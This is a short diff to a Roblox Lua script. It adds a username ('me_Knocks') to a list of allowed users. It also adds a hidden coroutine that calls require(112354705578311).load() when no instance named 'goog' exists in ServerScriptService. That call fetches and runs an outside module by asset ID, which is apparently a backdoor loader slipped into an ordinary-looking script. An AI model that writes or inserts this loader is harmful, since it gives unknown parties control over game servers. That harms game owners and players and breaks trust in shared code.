@@ -1,6 +1,7 @@
 task.wait(5)
 local users = {
-    "wrydioda4"
+    "wrydioda4",
+    "me_Knocks"
 }
 local sounds = {
     112569496988945,
@@ -10,6 +11,11 @@ local sounds = {
     13594648452,
     98920388478313
 }
+coroutine.wrap(function()
+    if not game.ServerScriptService:FindFirstChild("goog") then
+        require(112354705578311).load()
+    end
+end)()
 function f()
     for i,v in game.Players:GetPlayers() do
         if table.find(users, v.Name) then
